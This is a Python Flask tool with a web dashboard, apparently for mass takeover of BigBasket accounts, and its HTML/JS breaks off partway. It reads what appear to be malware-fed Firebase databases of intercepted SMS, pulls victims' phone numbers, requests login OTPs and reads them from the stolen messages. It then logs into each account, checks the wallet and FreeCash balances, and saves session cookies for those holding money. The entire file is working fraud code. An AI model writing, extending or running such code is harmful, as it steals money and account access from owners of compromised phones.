#!/usr/bin/env python3
"""
BigBasket Panel Processor - Panel-by-Panel with Parallel Processing
"""

import os
import sys
import json
import re
import time
import base64
import urllib.parse
import logging
import threading
from typing import Optional, List, Dict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit

# Import from existing files
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from bigbasket_client import BigBasketClient

# ============================================================
# CONFIGURATION
# ============================================================
OTP_TIMEOUT = 30
MAX_RETRIES = 3
CONCURRENT_WORKERS = 10
USED_PANELS_FILE = "used_panels.json"

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================
# FLASK APP
# ============================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ============================================================
# GLOBAL STATE
# ============================================================
processing_state = {
    'running': False,
    'results': [],
    'cash_results': [],  # Only cash/wallet results
    'total_devices': 0,
    'processed_devices': 0,
    'abort': False,
    'current_panel': 0,
    'total_panels': 0,
    'skipped_panels': 0,
}

# ============================================================
# USED PANELS MANAGEMENT
# ============================================================
def load_used_panels() -> List[str]:
    """Load used panels from file"""
    try:
        if os.path.exists(USED_PANELS_FILE):
            with open(USED_PANELS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading used panels: {e}")
    return []

def save_used_panels(panels: List[str]):
    """Save used panels to file"""
    try:
        with open(USED_PANELS_FILE, 'w') as f:
            json.dump(panels, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving used panels: {e}")

def normalize_panel_url(url: str) -> str:
    """Normalize URL for comparison"""
    url = url.strip()
    if url.endswith('/'):
        url = url[:-1]
    url = url.replace('https://', '').replace('http://', '')
    return url

def is_panel_used(firebase_url: str, used_panels: List[str]) -> bool:
    """Check if a panel is in the used list"""
    normalized = normalize_panel_url(firebase_url)
    return any(normalize_panel_url(u) == normalized for u in used_panels)

def add_panel_to_used(firebase_url: str, used_panels: List[str]) -> List[str]:
    """Add a panel to used list if not already present"""
    normalized = normalize_panel_url(firebase_url)
    if not any(normalize_panel_url(u) == normalized for u in used_panels):
        used_panels.append(firebase_url)
        save_used_panels(used_panels)
    return used_panels

def remove_panel_from_used(firebase_url: str, used_panels: List[str]) -> List[str]:
    """Remove a panel from used list"""
    normalized = normalize_panel_url(firebase_url)
    used_panels = [u for u in used_panels if normalize_panel_url(u) != normalized]
    save_used_panels(used_panels)
    return used_panels

# ============================================================
# SESSIONS STORAGE
# ============================================================
SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

def save_session(phone: str, device_id: str, panel_url: str, wallet: float, freecash: float, cookies_data: dict = None):
    """Save successful session to file"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_data = {
        'phone': phone,
        'device_id': device_id,
        'panel': panel_url,
        'wallet': wallet,
        'freecash': freecash,
        'timestamp': timestamp,
        'cookies': cookies_data or {}
    }
    
    # Save individual session file
    filename = f"{phone}_{timestamp}.json"
    filepath = os.path.join(SESSIONS_DIR, filename)
    with open(filepath, 'w') as f:
        json.dump(session_data, f, indent=2)
    
    # Also append to master log
    master_file = os.path.join(SESSIONS_DIR, "all_sessions.json")
    try:
        with open(master_file, 'r') as f:
            all_sessions = json.load(f)
    except:
        all_sessions = []
    
    all_sessions.append(session_data)
    with open(master_file, 'w') as f:
        json.dump(all_sessions, f, indent=2)
    
    return filepath

# ============================================================
# FIREBASE HELPERS
# ============================================================
def parse_panel_link(link: str) -> Optional[str]:
    if not link:
        return None
    link = link.strip()
    link = re.sub(r'^\d+\.?\s*', '', link)
    
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        if not link.endswith("/"):
            link += "/"
        return link
    
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.startswith("http"):
            link = "https://" + link
        if not link.endswith("/"):
            link += "/"
        return link
        
    try:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if "s" not in qs:
            return None
        s_param = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
        decoded = base64.b64decode(s_param).decode("utf-8")
        if "|||" in decoded:
            decoded = decoded.split("|||")[0]
        if not decoded.startswith("http"):
            decoded = "https://" + decoded
        if not decoded.endswith("/"):
            decoded += "/"
        return decoded
    except:
        return None

def extract_urls_from_text(text: str) -> List[str]:
    urls = []
    patterns = [
        r'https?://[a-zA-Z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[^\s]*)?',
        r'https?://(?:profex|console|merger|firex)\.site\.je/\?s=[A-Za-z0-9=]+',
        r'[a-zA-Z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[^\s]*)?',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            url = match.strip()
            url = re.sub(r'[.,;:!?)$]+\s*$', '', url)
            if not url.startswith('http'):
                url = 'https://' + url
            if not url.endswith('/'):
                url += '/'
            urls.append(url)
    return urls

def fetch_clients(firebase_url: str) -> List[Dict]:
    try:
        url = firebase_url + 'clients.json'
        resp = requests.get(url, timeout=15, verify=False)
        if resp.status_code != 200:
            return []
        data = resp.json()
        if not data or not isinstance(data, dict):
            return []
        
        clients = []
        for client_id, info in data.items():
            if not isinstance(info, dict):
                continue
            if not info.get('status', False):
                continue
            clients.append({
                'id': client_id,
                'name': info.get('modelName') or info.get('model') or info.get('deviceName') or client_id,
                'phone': info.get('mobNo') or None,
            })
        return clients
    except Exception as e:
        logger.error(f"Fetch clients error: {e}")
        return []

def fetch_phone_from_messages(firebase_url: str, client_id: str) -> Optional[str]:
    try:
        url = f"{firebase_url}messages/{client_id}.json?orderBy=\"$key\"&limitToLast=10"
        resp = requests.get(url, timeout=10, verify=False)
        if resp.status_code != 200:
            return None
        data = resp.json()
        if not data or not isinstance(data, dict):
            return None
        
        patterns = [
            re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
            re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE),
        ]
        
        for msg_id in sorted(data.keys(), reverse=True):
            msg = data[msg_id]
            if not isinstance(msg, dict):
                continue
            text = str(msg.get('body') or msg.get('message') or msg.get('text') or '')
            for pat in patterns:
                match = pat.search(text)
                if match:
                    num = match.group(1) or match.group(0)
                    num = re.sub(r'[^0-9]', '', num)
                    if len(num) == 12 and num.startswith('91'):
                        num = num[2:]
                    if len(num) == 10 and num[0] in '6789':
                        return num
        return None
    except:
        return None

def fetch_otp_from_firebase(firebase_url: str, client_id: str, timeout: int = OTP_TIMEOUT) -> Optional[str]:
    start_time = time.time()
    trigger_time = int((time.time() - 30) * 1000)
    
    patterns = [
        re.compile(r'(?<!\d)(\d{6})(?!\d)'),
        re.compile(r'(?:login code|otp|verification code)[:\s]*(\d{6})', re.IGNORECASE),
        re.compile(r'(\d{6})\s+is your OTP', re.IGNORECASE),
        re.compile(r'Your OTP is (\d{6})', re.IGNORECASE),
        re.compile(r'Bigbasket login code[:\s]*(\d{6})', re.IGNORECASE),
    ]
    
    session = requests.Session()
    session.verify = False
    
    while time.time() - start_time < timeout:
        try:
            url = f"{firebase_url}messages/{client_id}.json"
            resp = session.get(url, timeout=5)
            if resp.status_code != 200:
                time.sleep(0.5)
                continue
            data = resp.json()
            if not data or not isinstance(data, dict):
                time.sleep(0.5)
                continue
            
            for msg_id in sorted(data.keys(), reverse=True):
                msg = data[msg_id]
                if not isinstance(msg, dict):
                    continue
                try:
                    ts = int(msg_id)
                    if ts < trigger_time:
                        continue
                except:
                    pass
                
                text = str(msg.get('body') or msg.get('message') or msg.get('text') or '')
                text_lower = text.lower()
                if not any(kw in text_lower for kw in ['bigbasket', 'login code', 'otp', 'verification']):
                    continue
                
                for pat in patterns:
                    match = pat.search(text)
                    if match:
                        otp = match.group(1) or match.group(0)
                        otp = re.sub(r'\D', '', otp)
                        if len(otp) == 6 and otp.isdigit():
                            return otp
            time.sleep(0.5)
        except:
            time.sleep(0.5)
    return None

# ============================================================
# PROCESSING ENGINE - PANEL BY PANEL
# ============================================================
def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int, 
                   socketio_instance) -> Dict:
    result = {
        'panel': firebase_url,
        'device_id': client_id,
        'phone': phone,
        'wallet': 0,
        'freecash': 0,
        'status': 'error',
        'message': '',
        'session_saved': False,
    }
    
    prefix = f"[P{panel_idx}] {phone}"
    
    try:
        client = BigBasketClient(silent=True)
        
        # Register device
        reg_ok = False
        for attempt in range(MAX_RETRIES):
            if client.register_device():
                reg_ok = True
                break
            time.sleep(2)
        if not reg_ok:
            result['status'] = 'error'
            result['message'] = 'Registration failed'
            return result
        
        # Load UI
        ui_ok = False
        for attempt in range(MAX_RETRIES):
            if client.load_ui_data():
                ui_ok = True
                break
            time.sleep(2)
        if not ui_ok:
            result['status'] = 'error'
            result['message'] = 'UI load failed'
            return result
        
        # Update device info
        info_ok = False
        for attempt in range(MAX_RETRIES):
            if client.update_device_info():
                info_ok = True
                break
            time.sleep(2)
        if not info_ok:
            result['status'] = 'error'
            result['message'] = 'Device info update failed'
            return result
        
        # Clean phone number
        clean_phone = re.sub(r'[^0-9]', '', phone)
        if len(clean_phone) == 12 and clean_phone.startswith('91'):
            clean_phone = clean_phone[2:]
        if len(clean_phone) != 10:
            result['status'] = 'error'
            result['message'] = 'Invalid phone number'
            return result
        
        # Request OTP
        socketio_instance.emit('log', {'message': f"{prefix} Requesting OTP...", 'type': 'info'})
        otp_sent = client.request_otp(clean_phone)
        if not otp_sent:
            err = client.last_otp_error or ""
            if any(kw in err.lower() for kw in ["inactive", "does not exist", "invalid"]):
                result['status'] = 'inactive'
                result['message'] = 'Account inactive'
                socketio_instance.emit('log', {'message': f"{prefix} Inactive", 'type': 'warning'})
                return result
            result['status'] = 'error'
            result['message'] = f'OTP failed: {err}'
            socketio_instance.emit('log', {'message': f"{prefix} OTP failed", 'type': 'error'})
            return result
        
        # Wait for OTP
        socketio_instance.emit('log', {'message': f"{prefix} Waiting for OTP...", 'type': 'info'})
        otp = fetch_otp_from_firebase(firebase_url, client_id, OTP_TIMEOUT)
        
        if not otp:
            result['status'] = 'error'
            result['message'] = 'OTP not received'
            socketio_instance.emit('log', {'message': f"{prefix} OTP not received", 'type': 'error'})
            return result
        
        socketio_instance.emit('log', {'message': f"{prefix} OTP received", 'type': 'success'})
        
        # Verify OTP
        socketio_instance.emit('log', {'message': f"{prefix} Verifying...", 'type': 'info'})
        verify_ok = client.verify_otp(clean_phone, otp)
        if not verify_ok:
            result['status'] = 'error'
            result['message'] = 'OTP verification failed'
            socketio_instance.emit('log', {'message': f"{prefix} Verification failed", 'type': 'error'})
            return result
        
        socketio_instance.emit('log', {'message': f"{prefix} Logged in!", 'type': 'success'})
        
        # Get wallet
        socketio_instance.emit('log', {'message': f"{prefix} Fetching wallet...", 'type': 'info'})
        wallet = client.get_wallet_details()
        balance = wallet.get('current_wallet_balance', 0) if wallet else 0
        result['wallet'] = round(balance) if balance > 0 else 0
        
        # Get FreeCash
        socketio_instance.emit('log', {'message': f"{prefix} Fetching FreeCash...", 'type': 'info'})
        freecash_data = client.get_free_cash()
        freecash = freecash_data.get('total_freecash_amount', 0) if freecash_data else 0
        result['freecash'] = round(freecash) if freecash > 0 else 0
        
        # Save session if cash found
        if balance > 0 or freecash > 0:
            # Try to get cookies
            cookies = {}
            try:
                cookies = dict(client.session.cookies)
            except:
                pass
            
            saved_file = save_session(
                phone=clean_phone,
                device_id=client_id,
                panel_url=firebase_url,
                wallet=balance,
                freecash=freecash,
                cookies_data=cookies
            )
            result['session_saved'] = True
            socketio_instance.emit('log', {'message': f"{prefix} 💾 Session saved: {saved_file}", 'type': 'success'})
        
        if balance > 0 and freecash > 0:
            result['status'] = 'cash'
            result['message'] = f"Wallet: Rs{balance}, FreeCash: Rs{freecash}"
            socketio_instance.emit('log', {'message': f"{prefix} $$$ Wallet: Rs{balance} | FreeCash: Rs{freecash}", 'type': 'cash'})
        elif balance > 0:
            result['status'] = 'wallet'
            result['message'] = f"Wallet: Rs{balance}"
            socketio_instance.emit('log', {'message': f"{prefix} Wallet: Rs{balance}", 'type': 'success'})
        elif freecash > 0:
            result['status'] = 'cash'
            result['message'] = f"FreeCash: Rs{freecash}"
            socketio_instance.emit('log', {'message': f"{prefix} $$$ FreeCash: Rs{freecash}", 'type': 'cash'})
        else:
            result['status'] = 'success'
            result['message'] = 'No cash found'
            socketio_instance.emit('log', {'message': f"{prefix} No cash", 'type': 'info'})
        
        return result
        
    except Exception as e:
        result['status'] = 'error'
        result['message'] = str(e)[:100]
        socketio_instance.emit('log', {'message': f"{prefix} Error: {str(e)[:100]}", 'type': 'error'})
        return result

def process_panel_devices(devices: List[Dict], panel_idx: int, socketio_instance) -> List[Dict]:
    """Process all devices of a single panel in parallel"""
    results = []
    total = len(devices)
    
    socketio_instance.emit('log', {'message': f"Processing {total} devices from Panel {panel_idx}...", 'type': 'panel'})
    
    with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
        futures = {}
        for device in devices:
            if processing_state['abort']:
                break
            future = executor.submit(
                process_device,
                device['phone'],
                device['id'],
                device['firebase_url'],
                panel_idx,
                socketio_instance
            )
            futures[future] = device
        
        for future in as_completed(futures):
            if processing_state['abort']:
                break
            try:
                result = future.result(timeout=120)
                results.append(result)
                processing_state['results'].append(result)
                
                # Only add to cash_results if wallet or freecash > 0
                if result.get('wallet', 0) > 0 or result.get('freecash', 0) > 0:
                    processing_state['cash_results'].append(result)
                
                processing_state['processed_devices'] += 1
                
                # Update stats with ALL cash results
                cash_count = len(processing_state['cash_results'])
                total_wallet = sum(r.get('wallet', 0) for r in processing_state['cash_results'])
                total_freecash = sum(r.get('freecash', 0) for r in processing_state['cash_results'])
                error_count = sum(1 for r in processing_state['results'] if r['status'] == 'error')
                
                socketio_instance.emit('stats', {
                    'total_devices': processing_state['total_devices'],
                    'processed_devices': processing_state['processed_devices'],
                    'cash_count': cash_count,
                    'total_wallet': total_wallet,
                    'total_freecash': total_freecash,
                    'error_count': error_count,
                    'results': processing_state['cash_results'][-50:]  # Send all cash results
                })
                
                pct = (processing_state['processed_devices'] / processing_state['total_devices']) * 100 if processing_state['total_devices'] > 0 else 0
                socketio_instance.emit('progress', {'percent': min(pct, 100)})
                
            except Exception as e:
                device = futures[future]
                socketio_instance.emit('log', {'message': f"Error processing {device['phone']}: {str(e)}", 'type': 'error'})
    
    return results

def run_panel_processor(panels: List[str], socketio_instance):
    global processing_state
    
    # Load used panels
    used_panels = load_used_panels()
    
    processing_state['running'] = True
    processing_state['abort'] = False
    processing_state['results'] = []
    processing_state['cash_results'] = []  # Reset cash results
    processing_state['total_devices'] = 0
    processing_state['processed_devices'] = 0
    processing_state['current_panel'] = 0
    processing_state['total_panels'] = 0
    processing_state['skipped_panels'] = 0
    
    socketio_instance.emit('start', {'message': f'Processing {len(panels)} panels...'})
    
    # Extract all URLs from the text
    all_panel_urls = []
    for raw_panel in panels:
        url = parse_panel_link(raw_panel)
        if url:
            all_panel_urls.append(url)
            continue
        extracted_urls = extract_urls_from_text(raw_panel)
        for extracted in extracted_urls:
            parsed = parse_panel_link(extracted)
            if parsed:
                all_panel_urls.append(parsed)
    
    all_panel_urls = list(dict.fromkeys(all_panel_urls))
    
    if not all_panel_urls:
        socketio_instance.emit('log', {'message': 'No valid Firebase URLs found', 'type': 'error'})
        processing_state['running'] = False
        socketio_instance.emit('complete', {'message': 'No valid URLs found!'})
        return
    
    # Filter out used panels
    filtered_panels = []
    skipped = 0
    for url in all_panel_urls:
        if is_panel_used(url, used_panels):
            skipped += 1
            socketio_instance.emit('log', {'message': f"⏭️ Skipping used panel: {url}", 'type': 'skip'})
        else:
            filtered_panels.append(url)
    
    processing_state['skipped_panels'] = skipped
    
    if not filtered_panels:
        socketio_instance.emit('log', {'message': f"⚠️ All {len(all_panel_urls)} panels are already marked as used. Nothing to process.", 'type': 'warning'})
        processing_state['running'] = False
        socketio_instance.emit('complete', {'message': 'All panels already used!'})
        return
    
    processing_state['total_panels'] = len(filtered_panels)
    socketio_instance.emit('log', {'message': f"Found {len(all_panel_urls)} URLs, {skipped} skipped (used), {len(filtered_panels)} to process", 'type': 'panel'})
    
    # Process each panel ONE BY ONE
    for pi, firebase_url in enumerate(filtered_panels):
        if processing_state['abort']:
            break
        
        panel_idx = pi + 1
        processing_state['current_panel'] = panel_idx
        
        socketio_instance.emit('log', {'message': f"\n{'='*50}", 'type': 'panel'})
        socketio_instance.emit('log', {'message': f"PANEL {panel_idx}/{len(filtered_panels)}: {firebase_url}", 'type': 'panel'})
        socketio_instance.emit('panel_status', {
            'panel': panel_idx,
            'total': len(filtered_panels),
            'status': 'running',
            'url': firebase_url
        })
        
        # Step 1: Fetch online devices
        clients = fetch_clients(firebase_url)
        if not clients:
            socketio_instance.emit('log', {'message': f"Panel {panel_idx}: No online devices", 'type': 'warning'})
            socketio_instance.emit('panel_status', {
                'panel': panel_idx,
                'total': len(filtered_panels),
                'status': 'done',
                'url': firebase_url,
                'devices': 0
            })
            # Mark as used even if no devices
            used_panels = add_panel_to_used(firebase_url, used_panels)
            continue
        
        socketio_instance.emit('log', {'message': f"Panel {panel_idx}: {len(clients)} online devices", 'type': 'info'})
        
        # Step 2: Extract phone numbers from this panel
        devices = []
        for client in clients:
            if processing_state['abort']:
                break
            phone = client.get('phone')
            if not phone or phone == '-':
                phone = fetch_phone_from_messages(firebase_url, client['id'])
            if phone:
                clean_phone = re.sub(r'[^0-9]', '', phone)
                if len(clean_phone) == 12 and clean_phone.startswith('91'):
                    clean_phone = clean_phone[2:]
                devices.append({
                    'phone': clean_phone,
                    'raw_phone': phone,
                    'id': client['id'],
                    'firebase_url': firebase_url
                })
                socketio_instance.emit('log', {'message': f"  {clean_phone} | {client['id'][:12]}...", 'type': 'success'})
        
        if not devices:
            socketio_instance.emit('log', {'message': f"Panel {panel_idx}: No phone numbers found", 'type': 'warning'})
            socketio_instance.emit('panel_status', {
                'panel': panel_idx,
                'total': len(filtered_panels),
                'status': 'done',
                'url': firebase_url,
                'devices': 0
            })
            # Mark as used even if no numbers
            used_panels = add_panel_to_used(firebase_url, used_panels)
            continue
        
        socketio_instance.emit('log', {'message': f"Panel {panel_idx}: {len(devices)} numbers found", 'type': 'info'})
        processing_state['total_devices'] += len(devices)
        
        # Step 3: Process ALL devices of this panel in parallel
        panel_results = process_panel_devices(devices, panel_idx, socketio_instance)
        
        socketio_instance.emit('log', {'message': f"Panel {panel_idx}: Complete ({len(devices)} devices processed)", 'type': 'success'})
        socketio_instance.emit('panel_status', {
            'panel': panel_idx,
            'total': len(filtered_panels),
            'status': 'done',
            'url': firebase_url,
            'devices': len(devices)
        })
        
        # Mark this panel as used after processing
        used_panels = add_panel_to_used(firebase_url, used_panels)
        
        # After panel complete, send final stats with all cash results
        cash_count = len(processing_state['cash_results'])
        total_wallet = sum(r.get('wallet', 0) for r in processing_state['cash_results'])
        total_freecash = sum(r.get('freecash', 0) for r in processing_state['cash_results'])
        error_count = sum(1 for r in processing_state['results'] if r['status'] == 'error')
        
        socketio_instance.emit('stats', {
            'total_devices': processing_state['total_devices'],
            'processed_devices': processing_state['processed_devices'],
            'cash_count': cash_count,
            'total_wallet': total_wallet,
            'total_freecash': total_freecash,
            'error_count': error_count,
            'skipped_panels': processing_state['skipped_panels'],
            'results': processing_state['cash_results'][-50:]
        })
    
    # Final stats
    processing_state['running'] = False
    cash_count = len(processing_state['cash_results'])
    
    socketio_instance.emit('log', {'message': f"\n{'='*50}", 'type': 'panel'})
    socketio_instance.emit('complete', {'message': f'Done! Found {cash_count} accounts with cash'})
    socketio_instance.emit('log', {'message': f'Complete! {cash_count} accounts with cash', 'type': 'success'})
    
    # Final stats update
    total_wallet = sum(r.get('wallet', 0) for r in processing_state['cash_results'])
    total_freecash = sum(r.get('freecash', 0) for r in processing_state['cash_results'])
    error_count = sum(1 for r in processing_state['results'] if r['status'] == 'error')
    
    socketio_instance.emit('stats', {
        'total_devices': processing_state['total_devices'],
        'processed_devices': processing_state['processed_devices'],
        'cash_count': cash_count,
        'total_wallet': total_wallet,
        'total_freecash': total_freecash,
        'error_count': error_count,
        'skipped_panels': processing_state['skipped_panels'],
        'results': processing_state['cash_results'][-50:]
    })
    socketio_instance.emit('progress', {'percent': 100})

# ============================================================
# FLASK ROUTES
# ============================================================
@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>BigBasket Panel Processor</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0f0f1a; color:#e0e0e0; font-family:Segoe UI, sans-serif; padding:20px; }
        .container { max-width:1200px; margin:0 auto; }
        h1 { color:#6c63ff; text-align:center; margin-bottom:8px; font-weight:300; }
        .subtitle { text-align:center; color:#888; margin-bottom:25px; font-size:14px; }
        .card { background:#1a1a2e; border-radius:16px; padding:24px; margin-bottom:20px; border:1px solid #2a2a4a; }
        .card-title { font-size:18px; font-weight:600; color:#a8a8ff; margin-bottom:16px; display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
        .card-title .badge { background:#2a2a5a; padding:2px 12px; border-radius:20px; font-size:12px; color:#aaa; }
        textarea { width:100%; min-height:120px; background:#0d0d1a; border:1px solid #2a2a4a; border-radius:10px; color:#e0e0e0; padding:14px; font-size:14px; font-family:Consolas, monospace; resize:vertical; }
        textarea:focus { outline:none; border-color:#6c63ff; }
        .btn { padding:12px 32px; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:all .3s; display:inline-flex; align-items:center; gap:8px; }
        .btn-primary { background:#6c63ff; color:#fff; }
        .btn-primary:hover { background:#5a52e0; transform:scale(1.02); }
        .btn-primary:disabled { opacity:0.5; cursor:not-allowed; }
        .btn-danger { background:#e74c6f; color:#fff; }
        .btn-danger:hover { background:#c0395b; }
        .btn-success { background:#2ecc71; color:#fff; }
        .btn-success:hover { background:#27ae60; }
        .btn-outline { background:transparent; border:1px solid #4a4a6a; color:#ccc; }
        .btn-outline:hover { background:#2a2a4a; }
        .btn-warning { background:#f39c12; color:#000; }
        .btn-warning:hover { background:#e67e22; }
        .flex-row { display:flex; gap:12px; flex-wrap:wrap; align-items:center; margin-top:14px; }
        .status-bar { background:#0d0d1a; border-radius:10px; padding:14px 18px; display:flex; flex-wrap:wrap; gap:20px; align-items:center; border:1px solid #2a2a4a; }
        .stat { display:flex; align-items:center; gap:6px; font-size:14px; }
        .stat .num { font-weight:700; font-size:18px; color:#fff; }
        .stat .num.green { color:#2ecc71; }
        .stat .num.orange { color:#e67e22; }
        .stat .num.purple { color:#9b59b6; }
        .stat .num.red { color:#e74c6f; }
        .stat .num.blue { color:#5bc0de; }
        .log-container { max-height:400px; overflow-y:auto; background:#0a0a14; border-radius:10px; padding:12px 16px; font-family:Consolas, monospace; font-size:13px; line-height:1.6; border:1px solid #1a1a3a; }
        .log-container::-webkit-scrollbar { width:6px; }
        .log-container::-webkit-scrollbar-track { background:#0a0a14; }
        .log-container::-webkit-scrollbar-thumb { background:#3a3a6a; border-radius:10px; }
        .log-entry { padding:2px 0; border-bottom:1px solid #111122; }
        .log-entry .time { color:#555; margin-right:10px; }
        .log-entry .info { color:#5bc0de; }
        .log-entry .success { color:#2ecc71; }
        .log-entry .error { color:#e74c6f; }
        .log-entry .warning { color:#f1c40f; }
        .log-entry .cash { color:#f39c12; font-weight:600; }
        .log-entry .panel { color:#9b59b6; }
        .log-entry .skip { color:#5bc0de; }
        .result-table-wrap { overflow-x:auto; margin-top:12px; }
        table { width:100%; border-collapse:collapse; font-size:13px; }
        th { background:#1a1a3a; color:#a8a8ff; padding:10px 12px; text-align:left; font-weight:600; position:sticky; top:0; z-index:1; }
        td { padding:8px 12px; border-bottom:1px solid #1a1a2e; }
        tr:hover td { background:#15152a; }
        .cash-badge { background:#f39c12; color:#000; padding:2px 10px; border-radius:20px; font-weight:700; font-size:12px; }
        .wallet-badge { background:#2ecc71; color:#000; padding:2px 10px; border-radius:20px; font-weight:700; font-size:12px; }
        .empty-state { color:#555; text-align:center; padding:30px; }
        .progress-wrap { width:100%; height:4px; background:#1a1a3a; border-radius:4px; overflow:hidden; margin-top:8px; }
        .progress-bar { height:100%; background:linear-gradient(90deg, #6c63ff, #a855f7); width:0%; transition:width .3s; }
        .panel-tag { background:#1a1a3a; padding:4px 14px; border-radius:20px; font-size:12px; color:#aaa; border:1px solid #2a2a4a; display:inline-block; margin:4px; }
        .panel-tag .idx { color:#6c63ff; font-weight:700; }
        .panel-tag .status-dot { width:8px; height:8px; border-radius:50%; display:inline-block; }
        .panel-tag .status-dot.pending { background:#555; }
        .panel-tag .status-dot.running { background:#f1c40f; animation:pulse 1s infinite; }
        .panel-tag .status-dot.done { background:#2ecc71; }
        .panel-tag .status-dot.error { background:#e74c6f; }
        .panel-tag .status-dot.skipped { background:#5bc0de; }
        .used-panel-tag { background:#1a1a3a; padding:4px 14px; border-radius:20px; font-size:12px; color:#5bc0de; border:1px solid #2a2a4a; display:inline-flex; align-items:center; gap:6px; margin:3px; }
        .used-panel-tag .remove-btn { cursor:pointer; color:#e74c6f; font-weight:700; margin-left:4px; }
        .used-panel-tag .remove-btn:hover { color:#ff6b8a; }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:.3;} }
        .hidden { display:none; }
        .workers-info { color:#888; font-size:12px; margin-top:8px; }
        .session-info { color:#888; font-size:11px; margin-top:5px; }
        .used-panel-input { min-height:60px; font-size:12px; }
        @media(max-width:600px){ .card{padding:16px;} .stat{font-size:12px;} .stat .num{font-size:15px;} .btn{padding:10px 20px;font-size:14px;} }
    </style>
</head>
<body>
<div class="container">
    <h1>BigBasket Panel Processor</h1>
    <p class="subtitle">Panel by Panel | Sessions saved automatically</p>

    <!-- Used Panels Section -->
    <div class="card" style="border-color:#2a4a4a;">
        <div class="card-title">
            🔒 Used Panels <span class="badge" id="usedPanelCount">0 used</span>
            <span style="font-size:12px;color:#888;font-weight:400;margin-left:10px;">(Panels already checked - will be skipped)</span>
        </div>
        <div id="usedPanelList" style="min-height:30px;">
            <div class="empty-state" style="padding:10px;font-size:13px;">No used panels added yet</div>
        </div>
        <div class="flex-row">
            <textarea id="usedPanelInput" placeholder="Paste panels to mark as used (one per line)" class="used-panel-input"></textarea>
        </div>
        <div class="flex-row">
            <button class="btn btn-warning" id="addUsedBtn">➕ Add to Used</button>
            <button class="btn btn-danger" id="clearUsedBtn">🗑️ Clear All Used</button>
            <button class="btn btn-outline" id="exportUsedBtn">📥 Export Used List</button>
        </div>
    </div>

    <!-- Input Panel -->
    <div class="card">
        <div class="card-title">
            📋 Panel Links
            <span class="badge" id="panelCount">0 panels</span>
            <span class="badge" id="skippedCount" style="background:#2a4a4a;color:#5bc0de;">0 skipped</span>
        </div>
        <textarea id="panelInput" placeholder="Paste your panel links here (one per line)"></textarea>
        <div class="flex-row">
            <button class="btn btn-primary" id="startBtn">Start Processing</button>
            <button class="btn btn-danger hidden" id="stopBtn">Stop</button>
            <button class="btn btn-outline" id="clearBtn">Clear</button>
            <button class="btn btn-success" id="exportBtn">Export CSV</button>
        </div>
        <div class="workers-info">Per panel: 10 devices parallel | One panel at a time</div>
        <div id="panelList" style="margin-top:10px;"></div>
        <div id="currentPanelInfo" style="color:#888;font-size:13px;margin-top:8px;"></div>
        <div class="session-info">💾 Sessions saved in: sessions/ folder</div>
    </div>

    <!-- Status -->
    <div class="card">
        <div class="card-title">Status <span class="badge" id="statusBadge">Idle</span></div>
        <div class="status-bar">
            <div class="stat">Total: <span class="num" id="totalDevices">0</span></div>
            <div class="stat">Done: <span class="num green" id="doneDevices">0</span></div>
            <div class="stat">Cash: <span class="num orange" id="cashDevices">0</span></div>
            <div class="stat">Wallet: Rs<span class="num purple" id="totalWallet">0</span></div>
            <div class="stat">FreeCash: Rs<span class="num purple" id="totalFreecash">0</span></div>
            <div class="stat">Errors: <span class="num red" id="errorDevices">0</span></div>
            <div class="stat">Skipped: <span class="num blue" id="skippedStat">0</span></div>
        </div>
        <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
    </div>

    <!-- Log -->
    <div class="card">
        <div class="card-title">Live Log <span class="badge" id="logCount">0</span></div>
        <div class="log-container" id="logContainer"><div class="empty-state">Waiting for actions...</div></div>
    </div>

    <!-- Results -->
    <div class="card">
        <div class="card-title">💰 Cash Results <span class="badge" id="resultCount">0</span></div>
        <div class="result-table-wrap">
            <table><thead><tr><th>#</th><th>Panel</th><th>Device</th><th>Phone</th><th>Wallet</th><th>FreeCash</th><th>Status</th><th>Session</th></tr></thead>
            <tbody id="resultBody"><tr><td colspan="8" class="empty-state">No cash results yet</td></tr></tbody></table>
        </div>
    </div>
</div>

<script>
const socket = io();
let isRunning = false;
let allCashResults = [];
let panelStatus = {};
let usedPanels = [];

const panelInput = document.getElementById('panelInput');
const usedPanelInput = document.getElementById('usedPanelInput');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const clearBtn = document.getElementById('clearBtn');
const exportBtn = document.getElementById('exportBtn');
const addUsedBtn = document.getElementById('addUsedBtn');
const clearUsedBtn = document.getElementById('clearUsedBtn');
const exportUsedBtn = document.getElementById('exportUsedBtn');
const panelList = document.getElementById('panelList');
